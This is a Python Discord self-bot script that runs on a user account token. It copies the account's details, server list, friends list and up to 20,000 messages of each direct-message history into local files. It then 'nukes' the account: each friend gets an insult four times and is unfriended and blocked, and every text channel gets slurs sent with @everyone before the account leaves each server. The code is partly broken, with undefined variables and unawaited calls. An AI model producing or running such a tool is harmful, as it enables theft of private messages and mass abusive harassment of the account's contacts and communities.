import discord
from time import sleep
from discord.ext import commands

intents = discord.Intents.all()
client = discord.Client(intents=intents)

def nuke():
    try:
        client.user.edit(avatar=None)
    except ClientException:
        print("Removing avatar failed, do it yourself")
        sleep(3)
    client.user.edit_settings(status="there should be something cool here")

    for relationship in theuser.relationships:
        if (relationship.type == discord.RelationshipType.blocked):
            relationship.user.unblock()
        elif (relationship.type == discord.RelationshipType.friend): 
            dmchan = relationship.user.dm_channel 
            for i in range(0, 4):
                dmchan.send(content="UR A CUNT")
            relationship.user.unfriend()
            relationship.user.block()
             
    for guild in client.guilds:
        print("Offending " + guild.name)
        if (guild.name == '/crt/'):
          crtlist = open("crt_memberlist.txt", "w")
          for member in guild.members:
            crtlist.write((member.name + "#" + member.discriminator))
          crtlist.close()            
        
        for channel in guild.channels:
            if channel.type == 'Text':
                if channel.is_nsfw == True:
                   channel.send(content="You're all degenerate faggots @everyone")
                else:
                   channel.send(content="You're all fucking losers @everyone")
        
        try:
            guild.leave()
        except HTTPException:
            pass    
            
@client.event
async def on_ready():
    theuser = client.user

    userinfo = open("userinfo.txt", "w+")
    userinfo.write("Name: {}\nUser ID: {}\nAccount creation date: {} UTC\n".format((theuser.name + "#" + theuser.discriminator), theuser.id, theuser.created_at))
    print(userinfo.read())
    userinfo.close()
    
    serverlist = open("serverlist.txt", "w")
    for guild in client.guilds:
        print(guild.name)
        serverlist.write("{} | {}\n".format(guild.name, guild.id))
    serverlist.close()
    
    friendslist = open("friendslist.txt", "w")
    for relationship in theuser.relationships:
        if (relationship.type == discord.RelationshipType.friend):
            print("Friends w/ {}".format((relationship.user.name + "#" + relationship.user.discriminator)))
            friendslist.write(relationship.user.name + "#" + relationship.user.discriminator + "\n")
            
            if (relationship.user.dm_channel != None):
                dmlog = open(("dms/" + relationship.user.name + ".txt"), "w")
                dmchan = relationship.user.dm_channel
                async for message in dmchan.history(limit=20000):
                    dmlog.write("{}: {}\n".format(message.author.name, message.content))
                dmlog.close()
    friendslist.close()

    input("Ready!")
    nuke()
    exit()

token = ""
client.run(token, bot=False)
